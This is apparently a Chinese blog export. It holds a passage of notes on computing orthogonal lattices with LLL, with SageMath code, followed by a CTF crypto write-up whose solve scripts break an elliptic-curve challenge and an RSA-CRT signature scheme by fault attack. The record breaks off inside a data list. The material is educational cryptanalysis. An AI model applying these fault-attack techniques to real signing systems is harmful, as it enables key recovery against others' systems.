中的任意元素可以由 $\\mathbf{b}_i$ 整系数线性表出，则这 $d$ 个向量形成 $\\mathit{\\Lambda}$ 中的一组基。 $\\mathit{\\Lambda}$ 中至少存在一组基。 $\\mathit{\\Lambda}$ 的基都有相同的基数，称为 $\\mathit{\\Lambda}$ 的维度。\n\n如果 $\\mathit{\\Omega}$ 包含 $\\mathit{\\Lambda}$ ，且两者有相同的维度，则称 $\\mathit{\\Lambda}$ 为 $\\mathit{\\Omega}$ 在 $\\mathbf{Z}^n$ 上的一个子格。（子格的定义？） $\\mathit{\\Lambda}$ 的所有基张成相同的 $\\mathbf{Q}^n$ 的 $Q$ 向量子空间（啥玩意？），记为 $E_{\\mathit{\\Lambda}}$ 。 $\\mathbf{Q}^n$ 上 $E_{\\mathit{\\Lambda}}$ 的维度与 $\\mathit{\\Lambda}$ 的维度相同。令格 $\\overline{\\mathit{\\Lambda}}=E_{\\mathit{\\Lambda}}\\cap\\mathbf{Z}^n$ 。 $\\mathit{\\Lambda}$ 是 $\\overline{\\mathit{\\Lambda}}$ 的一个子格。如果 $\\mathit{\\Lambda}=\\overline{\\mathit{\\Lambda}}$ ，那么我们称 $\\mathit{\\Lambda}$ 是一个完备格，特别的， $\\overline{\\mathit{\\Lambda}}$ 是一个完备格。\n\n> 笔者注记：\n这里首先将 $\\mathit{\\Lambda}$ 张成一个**有理数空间**，不局限于**整系数**向量组合了，记为 $E_{\\mathit{\\Lambda}}$ 的E我猜是**欧几里得**的意思？然后与 $\\mathbf{Z}^n$ 相交得到的是整数点集合 $\\overline{\\mathit{\\Lambda}}$ ，如此 $\\mathit{\\Lambda}$ 是 $\\overline{\\mathit{\\Lambda}}$ 子格的事应该挺自然的。然后如果两者相等，想象一下，都那样张成了都找不到新的点，那这个格确实也挺完备。\nPS:发现自己念了十年的欧几里得，难怪输入法打不出来（）\n\n令 $(\\mathbf{x},\\mathbf{y})\\rightarrow\\mathbf{x}.\\mathbf{y}$ 为一般意义上的欧里几德内积， $||.||$ 是它对应的范数 ~~（奇怪的表示方法）~~。令 $F=(E_{\\mathit{\\Lambda}})^-$ 是关于该内积的正交向量子空间。我们定义正交格 $\\mathit{\\Lambda}^-=F\\cap\\mathbf{Z}^n$ 。因此， $\\mathit{\\Lambda}^-$ 是一个 $\\mathbf{Z}^n$ 上的完备格，其维度为 $n-d$ 。这意味着 $(\\mathit{\\Lambda}^-)^-$ 等于 $\\overline{\\mathit{\\Lambda}}$ 。令 $\\mathcal{B}=(\\mathbf{b}_1,...,\\mathbf{b}_d)$ 为 $\\mathit{\\Lambda}$ 的一组基。\n\n> 笔者注记：\n看到这就有点迷糊了，捋一捋： $E_{\\mathit{\\Lambda}}$ 是 $\\mathit{\\Lambda}$ 张成出的有理空间，然后 $F$ 是其正交向量子空间，即**任意从 $\\mathit{\\Lambda}$ 和 $F$ 分别抓两个向量出来，其内积都为 $0$** 。\n再然后 $\\mathit{\\Lambda}^-$ 是 $F$ 的一个子格，**注意到 $\\mathit{\\Lambda}^-$ 把 $F$ 所有整数点都框进去了**，这就很有意思了，由上面的定义就不难得出正交格 $\\mathit{\\Lambda}^-$ 是一个 $\\mathbf{Z}^n$ 上的完备格。\n至于其维度为何是 $n-d$ ，有个概念叫**正交补**，就是正交空间的维数是刚刚好的，对于列空间维数为 $r$ 的矩阵 $A_{r\\times m}$ ，其左零空间的维数是 $m-r$ ，相加恰好为 $m$ 。举例来说，三维中与线正交的是二维空间，与面正交的是一维空间。\n这篇 paper 习惯用 $E^-$ 表示正交向量子空间，但似乎 $E^\\bot$ 的写法较为广泛。\n\n在 $\\mathbf{Z}^n$ 的正则基上解析每个 $\\mathbf{b}_j$ 如下：\n\n$$\n\\mathbf{b}\\_j =\n\\begin{pmatrix}\nb_{1,j} \\\\\\\\\nb_{2,j} \\\\\\\\\n\\vdots \\\\\\\\\nb_{n,j}\n\\end{pmatrix}\n$$\n（这里吐槽一下，由于下划线和 Markdown 语法有冲突，如果不加反斜杠， $b_j$ 写成 $\\mathbf{b}_j$ Latex 就会炸，下文一开始也炸了几回，弄了几次才发现是这问题）\n\n定义整数 $n\\times d$ 的整数矩阵 $B=(b_{i,j})_{1\\leq i\\leq n,1\\leq j\\leq d}$ ，格 $\\mathit{\\Lambda}$ 由 $B$ 的列向量张成，我们称 $\\mathit{\\Lambda}$ 由 $B$ 张成。令 $Q={^tB}B$ 为 $d\\times d$ 的对称 Gram 矩阵。 $Q$ 的行列式是与 $\\mathcal{B}$ 无关的正整数。 $\\mathit{\\Lambda}$ 的行列式被定义为 $\\det(\\mathit{\\Lambda})=\\sqrt{\\det(B)}$ 。\n\n> 笔者注记：\n这是的 ${^tB}$ 应该是 $B^T$ 的意思，又是奇怪的写法（）\n至于 Gram 矩阵，中文音译为格拉姆矩阵，对 $n$ 维欧氏空间上的 $k$ 个向量，其 Gram 矩阵为\n$$\n\\triangle(\\mathbf{v}_1,\\dots,\\mathbf{v}_k) =\n\\begin{pmatrix}\n\\langle\\mathbf{v}_1,\\mathbf{v}_1\\rangle & \\cdots & \\langle\\mathbf{v}_1,\\mathbf{v}_k\\rangle \\\\\\\\\n\\vdots & \\ddots & \\vdots \\\\\\\\\n\\langle\\mathbf{v}_k,\\mathbf{v}_1\\rangle & \\cdots & \\langle\\mathbf{v}_k,\\mathbf{v}_k\\rangle\n\\end{pmatrix}\n$$\n不难看出这个可以等价表示为 $V^T\\times V$ ，得出的矩阵也显然是对称的。\n这里 $\\mathit{\\Lambda}$ 不是一个方阵，故不能直接求出其行列式，那么就应该通过其 Gram 矩阵来求行列式，这里我觉得应该是 $\\det(\\mathit{\\Lambda})=\\sqrt{\\det(Q)}$ ，但我不确定。\n\n**定理1** 令 $\\mathit{\\Lambda}$ 为 $\\mathbf{Z}^n$ 上的完备格，那么 $\\det(\\mathit{\\Lambda}^-)=\\det(\\mathit{\\Lambda})$ 。\n证明：我们有 $\\mathit{\\Lambda}=E_{\\mathit{\\Lambda}}\\cap\\mathbf{Z}^n$ 和 $\\mathit{\\Lambda}^-=E_{\\mathit{\\Lambda}}^-\\cap\\mathbf{Z}^n$ 。从另一篇论文（我也没读过）我们知道：\n$$\n\\det(\\mathbf{Z}^n)=\\frac{\\det(E_{\\mathit{\\Lambda}}\\cap\\mathbf{Z}^n)}{\\det((E_{\\mathit{\\Lambda}}^-)\\cap(\\mathbf{Z}^n)^*)}\n$$\n其中 $(\\mathbf{Z}^n)^*$ 表示 $\\mathbf{Z}^n$ 上的极格。但 $\\det(\\mathbf{Z}^n)=1$ （？为什么要说但呢？）且 $(\\mathbf{Z}^n)^*=\\mathbf{Z}^n$ ，故 $\\det(\\mathit{\\Lambda}^-)=\\det(\\mathit{\\Lambda})$ 。\n\n**推论2** 令 $\\mathit{\\Lambda}$ 为 $\\mathbf{Z}^n$ 上的格，那么 $\\det((\\mathit{\\Lambda}^-)^-)=\\det(\\mathit{\\Lambda}^-)=\\det(\\overline{\\mathit{\\Lambda}})$ 。\n\n**定理3** 令 $(\\mathbf{b}_1,...,\\mathbf{b}_d)$为格$\\mathit{\\Lambda}$ 在 $\\mathbf{Z}^n$ 上的一组 LLL 约化基，那么：\n\n1. $\\det(\\mathit{\\Lambda})\\leq \\prod^d_{i=1}||\\mathbf{b}_i||\\leq 2^{d(d-1)/4}\\det(\\mathit{\\Lambda})$\n2. 对任意线性无关的向量 $\\mathbf{x}_1,...,\\mathbf{x}_t\\in\\mathit{\\Lambda}$ ，当 $1\\leq j \\leq t$ 时，有：\n$$\n||\\mathbf{b}_j||\\leq 2^{(d-1)/2}\\max(||\\mathbf{x}_1||,...,||\\mathbf{x}_t||)\n$$\n\n我们现在描述计算正交格的一组 LLL 约化基的基本方法。令 $\\mathcal{B}=(\\mathbf{b}_1,...,\\mathbf{b}\\_d)$ 为 $\\mathit{\\Lambda}$ 的一组基， $B=(b\\_{i,j})$ 为其对应的 $n\\times d$ 的矩阵。令 $c$ 为一个正整数常量。定义 $\\mathit{\\Omega}$为$\\mathbf{Z}^{n+d}$ 上由以下 $(n+d)\\times n$ 矩阵张成的格。\n\n$$\nB^-=\n\\begin{pmatrix}\nc\\times b_{1,1} & c\\times b_{2,1} & \\cdots & c\\times b_{n,1} \\\\\\\\\nc\\times b_{1,2} & c\\times b_{2,2} & \\cdots & c\\times b_{n,2} \\\\\\\\\n\\vdots & \\vdots & \\ddots & \\vdots \\\\\\\\\nc\\times b_{1,d} & c\\times b_{2,d} & \\cdots & c\\times b_{n,d} \\\\\\\\\n1 & 0 & \\cdots & 0 \\\\\\\\\n0 & 1 & \\cdots & 0 \\\\\\\\\n\\vdots & \\vdots & \\ddots & \\vdots \\\\\\\\\n0 & 0 & \\cdots & 1\n\\end{pmatrix}\n$$\n矩阵 $B^-$ 被分成两块：上面 $d\\times n$ 部分是 $c\\ {^tB}$ ，下面 $n\\times n$ 部分是单位阵。\n设 $p_{\\uparrow}$ 和 $p_{\\downarrow}$ 是两个投影，将 $\\mathbf{Z}^{n+d}$ 的任何向量分别映射到由其前 $d$ 个坐标构成的 $\\mathbf{Z}^d$ 向量和由其最后 $n$ 个坐标构成的 $\\mathbf{Z}^n$ 向量，所有投影都与正则基有关。~~（这段翻译累死我了）~~\n令 $\\mathbf{x}$ 为 $\\mathit{\\Omega}$ 的一个向量并记 $\\mathbf{y}=p_{\\downarrow}(\\mathbf{x})$ ，那么\n\n$$\np_{\\uparrow}(\\mathbf{y})=\n\\begin{pmatrix}\n\\mathbf{y}.\\mathbf{b}\\_1 \\\\\\\\\n\\vdots \\\\\\\\\n\\mathbf{y}.\\mathbf{b}\\_d\n\\end{pmatrix}\n$$\n因此，当且仅当 $p\\_{\\uparrow}(\\mathbf{x})=0$ 时有 $\\mathbf{y}\\in \\mathit{\\Lambda}^-$ 。此外，如果 $||\\mathbf{x}||\\leq c$ ，那么 $p_{\\uparrow}(\\mathbf{x})=0$ 。\n\n**定理4** 令 $(\\mathbf{x}_1,\\mathbf{x}_2,...,\\mathbf{x}_n)$ 为格 $\\mathit{\\Omega}$ 的一组 LLL 约化基。若\n\n$$\nc>2^{(n-1)/2+(n-d)(n-d-1)/4}\\det(\\overline{\\mathit{\\Lambda}})\n$$\n则 $(p_{\\downarrow}(\\mathbf{x}\\_1),p_{\\downarrow}(\\mathbf{x}\\_2),...,p_{\\downarrow}(\\mathbf{x}_{n-d}))$ 为 $\\overline{\\mathit{\\Lambda}}$ 的一组 LLL 约化基。\n\n使用阿达马不等式，我们得到以下算法：\n\n**算法5** 给定一组 $\\mathbf{Z}^n$ 上格 $\\mathit{\\Lambda}$ 的基 $(\\mathbf{b}_1,\\mathbf{b}_2,...,\\mathbf{b}_d)$ ，该算法计算一组 $\\overline{\\mathit{\\Lambda}}$ 的LLL约化基。\n\n1. 选取 $c=\\lceil2^{(n-1)/2+(n-d)(n-d-1)/4}\\prod^d_{j=1}||\\mathbf{b}_j||\\rceil$\n\n2. 计算 $(n+d)\\times n$ 的整数矩阵 $B^-$ 和 $\\mathbf{b}_1,...,\\mathbf{b}\\_d$ 对应的 $n\\times d$ 矩阵 $B=(b\\_{i,j})$\n\n3. 计算由 $B^-$ 张成的格的一组 LLL 约化基 $(\\mathbf{x}_1,\\mathbf{x}_2,...,\\mathbf{x}_n)$\n\n4. 输出 $(p_{\\downarrow}(\\mathbf{x}\\_1),p_{\\downarrow}(\\mathbf{x}\\_2),...,p_{\\downarrow}(\\mathbf{x}_{n-d}))$\n\n可以证明，这是一个关于空间维数 $n$ 、格维数 $d$ 和 $||\\mathbf{b}_j||$ 比特长度的任何上界的确定性多项式时间算法。在实践中，不需要选择这样大的常数 $c$ ，因为 LLL 算法的理论界非常悲观。（翻译了这么久都看不懂，我也很悲观.jpg）\n\n> 笔者注记：\n$\\lceil$和$\\rceil$表示向上取整，例如$\\lceil 1.2 \\rceil = 2$。\n\n#### 实现\n\n之前看过 Herry 师傅从 dbt 那抄的一个求法是用左零空间求解，代码如下\n\n```python\ndef orthogonal_lattice(B):\n    LB = B.transpose().left_kernel(basis=\"LLL\").basis_matrix()\n    return LB\n```\n\n但笔者发现这样似乎只能在低维下求解，高维情况下时间会爆炸（至少试过一夜都没跑出来）\n于是照着 paper 搓了一个 implemention ，快了很多，三分钟左右就能求解 $255\\times512$ 矩阵的正交格，代码如下\n\n```python\ndef orthogonal_lattice(B):\n    _d, _n = B.nrows(), B.ncols()\n    _c = 2 ** min(((_n-1)/2+(_n-_d)*(_n-_d-1)/4),20)    # this bound can be adjusted as needed\n    for b in B:\n        _c *= b.norm()\n    B_bot = (ceil(_c)*B).stack(identity_matrix(ZZ, _n))\n    B_r = B_bot.transpose().LLL()\n    LB = B_r.matrix_from_rows_and_columns(range(_n-_d), range(_d,_n+_d))\n    assert (B*LB.transpose()).is_zero()\n    return LB\n```\n\n## 参考\n\n* [P. Q. Nguyen and J. Stern. Merkle-Hellman revisited: A cryptoanalysis of the Qu-Vanstone cryptosystem based on group factorizations. In B. S. Kaliski Jr., editor, CRYPTO, volume 1294 of Lecture Notes in Computer Science, pages 198–212. Springer, 1997.](https://link.springer.com/chapter/10.1007/BFb0052236)\n\n* [Modulus Fault Attacks Against RSA-CRT Signatures](https://link.springer.com/article/10.1007/s13389-011-0015-x)\n\n* [知乎 线性代数之——正交向量与子空间](https://zhuanlan.zhihu.com/p/50483906)\n\n* [知乎 格拉姆矩阵（Gram matrix）详细解读](https://zhuanlan.zhihu.com/p/187345192)\n","source":"_posts/2022巅峰极客 Crypto.md","raw":"---\ntitle: 2022巅峰极客 Crypto\ndate: 2022-08-18 12:47:00\ntags: [CTF, 密码学]\ncategories: 题解\n---\n\n有瓜吃，美滋滋。\n<!--more-->\n\n题目质量一般，知识问答还全是搬运今年 ciscn 的。\n然后三个队友都没啥空，就我一个做了两道密码，排 88 名，对我这个菜鸡来说也还行吧。\n\n## point-power\n\n```python\nfrom Crypto.Util.number import *\nfrom gmpy2 import *\nfrom random import *\nfrom secrets import flag\n\nassert len(flag)==42\np=getPrime(600)\na=bytes_to_long(flag)\nb=randrange(2,p-1)\nE=EllipticCurve(GF(p),[a,b])\nG=E.random_element()\n\nx1,y1,_=G\nG=2*G\nx2,y2,_=G\n\nprint(f\"p = {p}\")\nprint(f\"b = {b}\")\nprint(f\"x1 = {x1}\")\nprint(f\"x2 = {x2}\")\n'''\np = 3660057339895840489386133099442699911046732928957592389841707990239494988668972633881890332850396642253648817739844121432749159024098337289268574006090698602263783482687565322890623\nb = 1515231655397326550194746635613443276271228200149130229724363232017068662367771757907474495021697632810542820366098372870766155947779533427141016826904160784021630942035315049381147\nx1 = 2157670468952062330453195482606118809236127827872293893648601570707609637499023981195730090033076249237356704253400517059411180554022652893726903447990650895219926989469443306189740\nx2 = 1991876990606943816638852425122739062927245775025232944491452039354255349384430261036766896859410449488871048192397922549895939187691682643754284061389348874990018070631239671589727\n'''\n```\n\n这题完全是现学现卖，之前只听说过椭圆曲线，然后就跑去学抽代忘记回来了。。。\n首先查到椭圆曲线的加法（两点相同的情形）：\n$$\nx_2=m^2-2x_1\\ (mod\\ p) \\ with \\ m=\\frac{3x_1^2+a}{2y_1}\n$$\n又在Sagemath文档查到曲线定义 $y_1^2=x_1^3+ax_1+b$ ，就能联立出一个一元二次方程， exp 如下：\n\n```python\np = 3660057339895840489386133099442699911046732928957592389841707990239494988668972633881890332850396642253648817739844121432749159024098337289268574006090698602263783482687565322890623\nb = 1515231655397326550194746635613443276271228200149130229724363232017068662367771757907474495021697632810542820366098372870766155947779533427141016826904160784021630942035315049381147\nx1 = 2157670468952062330453195482606118809236127827872293893648601570707609637499023981195730090033076249237356704253400517059411180554022652893726903447990650895219926989469443306189740\nx2 = 1991876990606943816638852425122739062927245775025232944491452039354255349384430261036766896859410449488871048192397922549895939187691682643754284061389348874990018070631239671589727\n\nK = GF(p)\nn=(K(x2+2*x1)).sqrt()\nP.<x>= PolynomialRing(K)\nA=1\nB=6*x1**2-4*n**2*x1\nC=-(4*n**2*x1**3+4*n**2*b-9*x1**4)\nf=A*x**2+B*x+C\nroots=f.roots()\nprint(roots)\nflag=roots[1][0]\nfrom Crypto.Util.number import *\nprint(long_to_bytes(int(flag)))\n```\n\n## strange curve\n\n```python\nfrom Crypto.Util.number import *\nfrom gmpy2 import *\nfrom secrets import flag\nimport random\n\ndef add(P,Q):\n    (x1,y1)=P\n    (x2,y2)=Q\n\n\n    x3=(x1+x2)*(1+y1*y2)*invert((1+x1*x2)*(1-y1*y2),p)%p\n    y3=(y1+y2)*(1+x1*x2)*invert((1-x1*x2)*(1+y1*y2),p)%p\n\n    return (x3,y3)\n\ndef mul(e,P):\n    Q=(0,0)\n    e=e%p\n    while e:\n        if e&1:\n            Q=add(Q,P)\n        P=add(P,P)\n        e>>=1\n    return Q\n\ndef Legendre(a,p):\n    return (pow((a%p+p)%p,(p-1)//2,p))%p\n\ndef get_ts(p):\n    p=p-1\n    count=0\n    while p%2==0:\n        count+=1\n        p=p//2\n    return count,p\n\ndef get_nonre(p):\n    a=random.randint(1,p)\n    while Legendre(a,p)==1:\n        a=random.randint(1,p)\n    return a\n\ndef amm2(a,p):\n    t,s=get_ts(p)\n    ta=pow(get_nonre(p),s,p)\n    tb=pow(a,s,p)\n    h=1\n    for i in range(1,t):\n        d=pow(tb,2**t-1-i,p)\n        if d==1:\n            k=0\n        else:\n            k=1\n        tb=(tb*pow(ta,2*k,p))%p\n        h=(h*pow(ta,k,p))%p\n        ta=pow(ta,2,p)\n    return h*pow(a,(s+1)//2,p)%p  \n\ndef solve(a,b,c,p):\n    tmpa=1\n    tmpb=b*inverse(a,p)%p\n    tmpc=c*inverse(a,p)%p\n    assert Legendre(tmpb**2*inverse(4,p)-tmpc,p)==1\n    res1=(amm2(tmpb**2*inverse(4,p)-tmpc,p)-tmpb*inverse(2,p))%p\n    res2=(-amm2(tmpb**2*inverse(4,p)-tmpc,p)-tmpb*inverse(2,p))%p\n    return (res1,res2)\n\ndef lift(x,a,b,p):\n    tmp=b*(x**2-1)*inverse(a*x,p)%p\n    return solve(1,-tmp,-1,p)[0]\n\np=9410547699903726871336507117271550134683191140146415131394654141737636910570480327296351841515571767317596027931492843621727002889086193529096531342265353\na=54733430689690725746438325219044741824500093621550218736194675295708808435509\nb=75237024593957256761258687646797952793573177095902495908321724558796076392871\nx=bytes_to_long(flag)\n\nwhile True:\n    try:\n        y=lift(x,a,b,p)\n        break\n    except:\n        x+=1\n        continue\n\nassert a*x*(y**2-1)%p==b*y*(x**2-1)%p\n\nP=(x,y)\ne=65537\n\neP=mul(e,P)\nprint(f\"P = {P}\")\nprint(f\"eP = {eP}\")\n'''\nP = (56006392793427940134514899557008545913996191831278248640996846111183757392968770895731003245209281149, 5533217632352976155681815016236825302418119286774481415122941272968513081846849158651480192550482691343283818244963282636939305751909505213138032238524899)\neP = (mpz(8694229840573103722999959579565187489450818138005222030156495740841851804943200684116883831426548909867463656993852596745698999492932194245562062558787005), mpz(9279986963919197374405152604360936066932975197577643570458423456304679111057526702737279809805694360981565554506626018364382736924914907001214909905449002))\n'''\n```\n\n这题真的是蚌不住，刚放出来解出数就蹭蹭往上涨，还有点怀疑人生，然后仔细观察题目，一看上面，什么玩意，再看下面，什么玩意。。。\n直接拿第一个数 `long_to_bytes` ，得到flag。\n\n## Learning with fault\n\n```python\nfrom Crypto.Util.number import *\nfrom gmpy2 import *\nfrom secrets import flag\nimport os\n\nclass RSA():\n    def __init__(self,p,q,e):\n        self.p=p\n        self.q=q\n        self.e=e\n        self.phi=(p-1)*(q-1)\n        self.d=invert(self.e,self.phi)\n        self.dp=self.d%(p-1)\n        self.dq=self.d%(q-1)\n        self.n=p*q\n        self.N=getPrime(512)*getPrime(512)\n\n    def sign(self,message):\n        m=bytes_to_long(message)\n        sig_p=pow(m,self.dp,self.p)\n        sig_q=pow(m,self.dq,self.q)\n        alpha=q*invert(q,p)\n        beta=p*invert(p,q)\n        return long_to_bytes((alpha*sig_p+beta*sig_q)%self.n)\n\n    def corrupt_sign(self,message):\n        m=bytes_to_long(message)\n        sig_p=pow(m,self.dp,self.p)\n        sig_q=pow(m,self.dq,self.q)\n        alpha=q*invert(q,p)\n        beta=p*invert(p,q)\n        return long_to_bytes((alpha*sig_p+beta*sig_q)%self.N)\n\n    def verify(self,message,sign):\n        return long_to_bytes(pow(bytes_to_long(sign),self.e,self.n))==message\n\np=getPrime(512)\nq=getPrime(512)\ne=65537\nrsa=RSA(p,q,e)\n\nwith open(\"sign.txt\",\"w\") as f1:\n    with open(\"corrupted_sign.txt\",\"w\") as f2:\n        for _ in range(6):\n            message=os.urandom(64)\n            sign=rsa.sign(message)\n            corrupted_sign=rsa.corrupt_sign(message)\n            assert rsa.verify(message,sign)\n            f1.write(str(sign)+'\\n')\n            f2.write(str(corrupted_sign)+'\\n')\n\nenc=pow(bytes_to_long(flag),rsa.e,rsa.n)\nprint(f\"n = {rsa.n}\")\nprint(f\"N = {rsa.N}\")\nprint(f\"e = {rsa.e}\")\nprint(f\"enc = {enc}\")\n'''\nn = 99670316685463632788041383175090257045961799409733877510733415402955763322569510896091638507050126669571444467488936880059210773298729542608112756526719533574432327269721804307073353651955251188547245641771980139488000798458617636759823027148955008149512692983471670488580994385743789385091027299901520585729\nN = 81332992898551792936282861980393365170738006789835182134055801566584228471896473385776004610279937176800796971820133195300006470892468060034368863410462219133248069442508287516929262751427926825122839525496671527936622212986733708071962237633082743396115729744192159064241674410003857168101669882043743570731\ne = 65537\nenc = 2476965183785968993595493003363618829317072815989584886372189393899395623714779397354978469504773556228655475355703015337932838278988328384587983506790841663233499939173166353582189202860394411808445422387063648198432242875738065748287034529713834303346017134249834382745931627301273142828893469374138264396\n'''\n```\n\n出题论文：<https://eprint.iacr.org/2011/388.pdf>\n这题一开始是搜到了论文，瞟了两眼，以为不是，就没看下去了。。。\n后来学长发给我这篇，我焯了两个钟复现出来了，说不定真有机会现场解出，唉还是太菜。\n照着论文的 Attack Summary 敲就行了，一开始没理解到 $z$ 向量的意思，直接从格子拿，跑不出来，学长问我 $a$ 和 $b$ 的选取是不是有问题，我才知道要枚举出所有 $x$ 和 $y$ 。然后 $a$ 和 $b$ 在 0 到 10 间选取也不行，改成了 -10 到 10 。\nexp 如下：\n\n```python\nfrom tqdm import tqdm\nfrom itertools import combinations\nfrom sage.all import *\nfrom Crypto.Util.number import *\nco_sig = [b\"\\x17\\x8bb3\\x11\\x1b\\xb9\\xb9\\xc6M\\xb0\\xaa\\x07-\\x1ar\\xff\\xfb\\xb4&H7!\\xb8\\xa1\\xce\\x07\\x8b\\x84M\\x0bw=m\\x193Oc\\x97w\\x8f\\xffy4\\xa1\\x99\\xfcW\\xf9|\\xeb\\xa4\\x00\\x1eD*\\xe8-'\\xa9\\xef\\x9d\\x13*\\xf4\\xbe\\x9d\\x9b&w\\xcb\\xfd\\xb3\\xb6\\xa3n\\xb8\\xb4\\x97vT\\xec@\\x86\\xd1R\\xb0\\n\\xe1uC\\xbc\\x14\\xeb\\xceSu&'{\\xb9\\x12\\x90\\x82\\xc7,\\xdbr\\xebP\\xe1j\\x11E\\xd5\\x17\\xe1\\xd0D\\xe7z\\x94vt\\xbf\\x1a\\xc4+\",\n          b'\\x1dJ\\xc5\\xb2\\xbe\\x05\\xe6\\xc8T\\n\\xbe\"\\xbeU\\xed\\xba\\xec\\x85\\x05\\x8b\\x8ayE\\xa3}0\\x1dk\\xa7\\x10\\xe2E\\x19\\xfe\\x10\\x90\\xef\\r\\xdbV\\x8b\\x87|(\\xd1\\xb5\\xfd\\xb9\\x14\\x84\\x05\\x03\\x81\\xc8\\xf6\\xe5\\x8a\\x92\\xa0\\x01I\\x8aG:\\xc19\\x9e\\xf0\\x8eZ\\\\Yx\\x80|\\xb7\\x80\\x0e\\xcd\\xa3\\xba6\\xf8\\x98\\xb1pB\\x05\\x8aT#\\xbf\\x1e\\x1b~\\xcb\\xf5\\t\\xa2H9\\xc9n\\x81e\\xa2\\x15\\x97\\x11\\xe4\\x93\\xf2\\xe6\\x80\\x97\\x99G\\xb5\\xfe\\x07/\\xd2\\xbd\\xad\\xcf\\x04\\x9e\\xd0',\n          b'Gs\\xda\\xb8\\x8a\\x85\\xccK\\xf7\\xa8y\\x16\\xa5\\xf0\\x06\\xbe\\xeb\\x83&}a\\x85q\\x8d:\\x1fSb\\xb8\\xc5\\x84\\xba*[\\xe7\\xbb{\\x86\\xd3\\xb3r\\xb6\\xaaCN\\x93\\x1d<(\\xe2\\x1c;\\x8crU\\x8fD=W\\xa7\\x0b\\xc7\\xeag\\x96\\x06\\xd6\\xbb\\xe4\\x04b\\xd8\\x02\\x12\\xd6\\xfa2\\x1e#\\xf0\\xde\\x8b\\x88M\\xd2\\xf47\\\\\\x98\\xe0\\x04Fu\\x1bsy\\xf2\\xc4\\xad\\xd6Y\\x81u~B:\\xd2\\x1f\\xb3\\xab\\x01:\\xfa\\xdf\\x19J8\\xd0\\x18RN\\xfe,CA\\x15\\xb3\\xe0',\n          b\"0I\\xda5\\x9f\\x05v\\x17\\xdc\\xd4q\\xd6\\x83,\\x9d\\r\\xccc\\x8a\\xa1\\xd4U\\xd3\\x18\\xc9\\xc6g\\xcd\\nX\\x99Ah\\xed}\\xf3\\xb1(\\xd5I\\xc6\\x0f@yw9\\x9d\\xfdv\\x15x\\xeaRA\\xd6\\xb0\\x1e\\xb5B\\xe5\\x05cc\\x06m\\xf4NN'\\x02q\\x1a\\x11\\xe4\\x87P:\\xc8\\x11a\\x9f\\xbd\\x9c\\x98x\\xda\\xea\\xc4\\xa8f\\x89s\\xcaJ\\x7f\\xeb\\xd8\\xc1G#\\xf4\\xdc\\xe2\\x01\\xf2\\xa5\\x95\\x19`)2!\\xf5\\xb9\\xf0\\xf2\\xbb\\xf8\\x0bF&&`\\xfd*\\xe1\\xf2\\x9c\",\n          b':\\x99/Hxt\\xd1\\xd4\\xaaB\\xd6H\\x16\\xe1\\xc9\\xe2\\xb3\\xc3\\xa9b\\xd3\\x96\\x9c\\x05x6\\xf1\\xc3d\\xa2\\xd1U+.\\x1b\\xac^\\xf6Mh7\\xb7\\x03\\x8e\\xdc\\xca\\x0bn\\xac\\xed\\x92\\xb8x\\x04)\\x0f|\\x11\\xcc\\xfa\\xf2\\\\\\xba\\xee\\xc4X\\xa8(\\x05\\xf2\\xb5\\x8f&\\xf3\\xff\\x1eB\\xe7\\x94\\xf4\\xa6\\x00!\\xe5v\\xd9x\\xf0s\\x94\\xf4D(\\xa9g\\x118\\xa7z\\x83\\xad\\xdb\\xe6\\xe3\\xe7\\xf8\\xf2\\xef\\xe5@\\xe9\\x13\\x00OB\\xcc\\x05\\xd1,_=\\xd2/Og\\x81\\xa6+',\n          b'\\x1c|\\xb6\\xcc\\xdfj\\xc5\\xa0s\\xac w\\xa6\\xf2\\x87D\\xe3\\xf9Y\\xf5=\\xf0\\x0b\\xd9\\xea\\x89,+e\\x1e\\xb7m#\\x99\\xd1\\x87\\x17Z\\xed\\x1d\\xc8\\x97;\\xa0K\\x05.\\xaa<\\xc6s\\xcf\\xa2\\xa2\\\\PO\\x12&\\xb4\\x11\\xec\\xad\\x10\\xf8\\xf7\\xd1\\xd3_\\x80\\x17\\xe0\\x1eP\\x93\\xe3\\xc2\\x1e\\x03\\xea]^\\xc6a\\x9c\\xcb\\x90\\xbb\\x9f\\x8by\\xa5dhM\\xce\\xc7\\xbc\\xf7\\xafe\\xcf\\xc1\\xf1\\x18@\\x1e\\xe2\\xdb\\xfb\\xe4^\\xc8\\xe7\\x19\\xccnY\\xc6o\\x7fL\\x9fV\\xd4\\xc4\\x15\\xe8',\n          ]\nsig = [b'\\t\\x8b\\xde\\x98\\x84\\x1d\\x9e\\xd4\\xa0\\xb7f\\xe0\\x05\\xb1\\xbd8\\xb9G\\xe3\\x0c\\x83\\x8a\\xe5\\xf0G7\\x12\\x1eT\\x85o-B\\xe4_\\xd2\\x04\\xd9:\\xab\\xdf\\xa1 \\x8f\\xedt+\\x0f\\xce\\xb5\\x90\\xaaK\\xf0U~v=\\x84\\xe7$G\\xf5\\xfb\\xd3ok~V\\x1a\\xec&\\x15\\x18Y\\x0c\\x80u\\xafF\\xf1\\x10\\x9f\\xf2\\xe6\\xa6\\x9a\\xbb\\xbd+\\xa4l\\xa9\\x11\\xd5\\t\\x13\\x16\\xa3\\xde\\xe1\\xdfZ\\xa9$r\\xb5`\\xc9\"\\x11\\xab\\xc5\\x87\\xc4\\x1d@\\x9e\\xa4t\\xdb#\\xbdj\\xcb\\x95\\xefK',\n       b'z/\\xd6\\xfb\\xd8\\xfa\\xc4\\xed\\xbd\\x99\\xd0\\xa0\\x90\\xcb\\xca\\x83\\xd8B\\xa7\\xf4\\xbd\\xe0\\xc2&\\x1aQl(\\xd6p\\x8f\\x89=tT\\xf1(\\xeb\\xab\\x84[oR\\x1fl=\\xda\\xf5\\x18q\\x8f\\xa7k\\x00\\x1b\\x1a\\x0ei\\x1fa.ho\\x15\\x04\\x12\\xe4\\xc2\\xd7\\x19\\x92\\xc3\\x9b\\xfe\\xd5\\xb6R\\xf8\\x95\\x9fr\\x93\\xddD\\x1c[\\x873\\xd5\\x06\\x1b\\xa5\\x82/6\\x9a\\x13\\xcf\\xa4\\xcd\\x0e]\\t\\xad?\\xd6\\x84\\r\\x90\\xef\\x86\\xf15)\\xe34\\xf7\\xb77\\xef\\x0c&\\xdb8\\xa6\\xe0\\xa5a',\n       